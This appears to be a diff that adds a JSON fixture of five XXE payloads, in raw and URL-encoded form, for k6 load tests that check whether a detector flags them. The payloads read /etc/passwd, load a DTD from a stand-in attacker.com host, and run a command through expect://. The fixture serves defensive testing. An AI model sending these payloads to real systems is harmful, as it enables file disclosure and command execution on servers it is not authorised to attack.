@@ -1,0 +1,65 @@
+{
+  "metadata": {
+    "category": "xxe",
+    "total_patterns": 5,
+    "port": 8007,
+    "description": "k6 test patterns for XXE attacks"
+  },
+  "patterns": [
+    {
+      "id": "XXE_ENTITY_001",
+      "name": "XXE external entity file disclosure",
+      "category": "xxe",
+      "subcategory": "entity_injection",
+      "payload": "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+      "encoded": "%3C!DOCTYPE%20test%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E",
+      "port": 8007,
+      "expected_detection": true,
+      "severity": "critical"
+    },
+    {
+      "id": "XXE_ENTITY_002",
+      "name": "XXE external DTD parameter entity",
+      "category": "xxe",
+      "subcategory": "entity_injection",
+      "payload": "<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">",
+      "encoded": "%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E",
+      "port": 8007,
+      "expected_detection": true,
+      "severity": "critical"
+    },
+    {
+      "id": "XXE_ENTITY_003",
+      "name": "XXE expect wrapper command execution",
+      "category": "xxe",
+      "subcategory": "entity_injection",
+      "payload": "<!ENTITY xxe SYSTEM \"expect://id\">",
+      "encoded": "%3C!ENTITY%20xxe%20SYSTEM%20%22expect%3A%2F%2Fid%22%3E",
+      "port": 8007,
+      "expected_detection": true,
+      "severity": "critical"
+    },
+    {
+      "id": "XXE_ENTITY_004",
+      "name": "XXE PHP filter base64 encoding",
+      "category": "xxe",
+      "subcategory": "entity_injection",
+      "payload": "<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">",
+      "encoded": "%3C!ENTITY%20%25%20file%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%22%3E",
+      "port": 8007,
+      "expected_detection": true,
+      "severity": "critical"
+    },
+    {
+      "id": "XXE_ENTITY_005",
+      "name": "XXE data URI scheme injection",
+      "category": "xxe",
+      "subcategory": "entity_injection",
+      "payload": "<!ENTITY xxe SYSTEM \"data:text/plain;base64,dGVzdA==\">",
+      "encoded": "%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E",
+      "port": 8007,
+      "expected_detection": true,
+      "severity": "high"
+    }
+  ]
+}
